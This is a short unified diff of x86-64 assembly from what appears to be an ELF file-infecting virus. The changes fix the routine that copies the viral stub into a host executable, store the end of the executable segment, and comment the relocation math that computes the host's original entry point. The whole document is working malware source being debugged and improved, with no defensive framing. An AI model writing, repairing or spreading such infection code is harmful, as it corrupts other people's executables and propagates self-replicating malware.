@@ -350,8 +350,9 @@ do_infect:
     test rdi, rdi
     jz .return
 
+    lea rsi, [rel _start]
     mov rcx, STUB_SIZE
-    repnz movsb
+    rep movsb
 
     mov rax, QWORD [r15 + Elf64_Ehdr.e_entry]
     mov QWORD [rdi - 16], r13
@@ -390,6 +391,7 @@ find_executable_segment:
         jb .next_segment
 
         add rax, QWORD [rdi + Elf64_Phdr.p_memsz]
+        mov r13, rax
         cmp rdx, rax
         jb .found_segment
     .next_segment:
@@ -460,9 +462,13 @@ try_map_host:
 ; void *get_base_address()
 ; Gets the base address of the running process.
 get_base_address:
+    ; current runtime address of virus entry point
     lea rax, [rel _start]
+    ; virus entry point address at compile-time
     mov rdx, [rel virus_entrypoint]
+    ; calculate relocation offset
     sub rax, rdx
+    ; apply relocation offset to host entry point
     add rax, [rel host_entrypoint]
     ret
 
